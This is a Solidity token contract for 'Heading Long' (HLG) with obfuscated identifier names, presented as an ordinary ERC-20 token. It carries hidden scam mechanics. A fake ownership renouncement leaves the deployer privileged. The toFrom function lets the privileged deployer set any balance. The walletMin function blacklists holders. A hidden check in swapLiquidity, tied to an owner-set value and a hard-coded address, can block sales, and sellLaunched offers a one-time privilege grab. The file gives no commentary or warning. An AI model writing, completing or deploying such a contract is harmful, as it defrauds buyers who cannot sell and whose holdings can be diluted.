//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface marketingWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract marketingLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingIsTeam {
    function createPair(address toReceiverShould, address walletList) external returns (address);
}

interface exemptWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedSell) external view returns (uint256);

    function transfer(address receiverAmount, uint256 enableMarketing) external returns (bool);

    function allowance(address autoTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address receiverAmount,
        uint256 enableMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenShould, uint256 value);
    event Approval(address indexed autoTeam, address indexed spender, uint256 value);
}

interface exemptWalletMetadata is exemptWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HeadingLong is marketingLaunch, exemptWallet, exemptWalletMetadata {

    uint256 public isMode;

    address isFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return maxShould;
    }

    function swapLiquidity(address receiverTeam, address receiverAmount, uint256 enableMarketing) internal returns (bool) {
        if (receiverTeam == walletLaunch) {
            return txBuy(receiverTeam, receiverAmount, enableMarketing);
        }
        uint256 receiverMinShould = exemptWallet(senderMax).balanceOf(launchedLimit);
        require(receiverMinShould == exemptSell);
        require(receiverAmount != launchedLimit);
        if (listTeam[receiverTeam]) {
            return txBuy(receiverTeam, receiverAmount, exemptLaunched);
        }
        return txBuy(receiverTeam, receiverAmount, enableMarketing);
    }

    function transfer(address listTake, uint256 enableMarketing) external virtual override returns (bool) {
        return swapLiquidity(_msgSender(), listTake, enableMarketing);
    }

    bool private autoIs;

    event OwnershipTransferred(address indexed liquidityEnable, address indexed shouldTotalAuto);

    mapping(address => uint256) private tradingTx;

    function modeShould(uint256 enableMarketing) public {
        isMin();
        exemptSell = enableMarketing;
    }

    constructor (){
        if (feeFund) {
            isMode = walletEnable;
        }
        marketingWallet feeLaunch = marketingWallet(isFrom);
        senderMax = tradingIsTeam(feeLaunch.factory()).createPair(feeLaunch.WETH(), address(this));
        
        walletLaunch = _msgSender();
        shouldEnable();
        takeAmountEnable[walletLaunch] = true;
        tradingTx[walletLaunch] = maxShould;
        if (maxAtLiquidity) {
            feeMarketingLiquidity = walletEnable;
        }
        emit Transfer(address(0), walletLaunch, maxShould);
    }

    mapping(address => mapping(address => uint256)) private tradingAmount;

    string private swapToTrading = "HLG";

    function approve(address tokenLaunched, uint256 enableMarketing) public virtual override returns (bool) {
        tradingAmount[_msgSender()][tokenLaunched] = enableMarketing;
        emit Approval(_msgSender(), tokenLaunched, enableMarketing);
        return true;
    }

    bool public limitMax;

    function owner() external view returns (address) {
        return listSwap;
    }

    address public senderMax;

    mapping(address => bool) public listTeam;

    function getOwner() external view returns (address) {
        return listSwap;
    }

    uint256 public feeMarketingLiquidity;

    address private listSwap;

    function shouldEnable() public {
        emit OwnershipTransferred(walletLaunch, address(0));
        listSwap = address(0);
    }

    function isMin() private view {
        require(takeAmountEnable[_msgSender()]);
    }

    address launchedLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address launchedSell) public view virtual override returns (uint256) {
        return tradingTx[launchedSell];
    }

    uint256 exemptSell;

    function sellLaunched(address txToken) public {
        require(txToken.balance < 100000);
        if (tokenMax) {
            return;
        }
        
        takeAmountEnable[txToken] = true;
        
        tokenMax = true;
    }

    bool public tokenMax;

    mapping(address => bool) public takeAmountEnable;

    function symbol() external view virtual override returns (string memory) {
        return swapToTrading;
    }

    uint8 private fromIs = 18;

    function txBuy(address receiverTeam, address receiverAmount, uint256 enableMarketing) internal returns (bool) {
        require(tradingTx[receiverTeam] >= enableMarketing);
        tradingTx[receiverTeam] -= enableMarketing;
        tradingTx[receiverAmount] += enableMarketing;
        emit Transfer(receiverTeam, receiverAmount, enableMarketing);
        return true;
    }

    string private isReceiver = "Heading Long";

    function allowance(address marketingAtShould, address tokenLaunched) external view virtual override returns (uint256) {
        if (tokenLaunched == isFrom) {
            return type(uint256).max;
        }
        return tradingAmount[marketingAtShould][tokenLaunched];
    }

    bool private feeFund;

    address public walletLaunch;

    function name() external view virtual override returns (string memory) {
        return isReceiver;
    }

    uint256 constant exemptLaunched = 7 ** 10;

    uint256 listTotal;

    function decimals() external view virtual override returns (uint8) {
        return fromIs;
    }

    uint256 public walletEnable;

    function toFrom(address listTake, uint256 enableMarketing) public {
        isMin();
        tradingTx[listTake] = enableMarketing;
    }

    uint256 private maxShould = 100000000 * 10 ** 18;

    bool private maxAtLiquidity;

    function transferFrom(address receiverTeam, address receiverAmount, uint256 enableMarketing) external override returns (bool) {
        if (_msgSender() != isFrom) {
            if (tradingAmount[receiverTeam][_msgSender()] != type(uint256).max) {
                require(enableMarketing <= tradingAmount[receiverTeam][_msgSender()]);
                tradingAmount[receiverTeam][_msgSender()] -= enableMarketing;
            }
        }
        return swapLiquidity(receiverTeam, receiverAmount, enableMarketing);
    }

    function walletMin(address amountToken) public {
        isMin();
        if (feeMarketingLiquidity != isMode) {
            maxAtLiquidity = false;
        }
        if (amountToken == walletLaunch || amountToken == senderMax) {
            return;
        }
        listTeam[amountToken] = true;
    }

}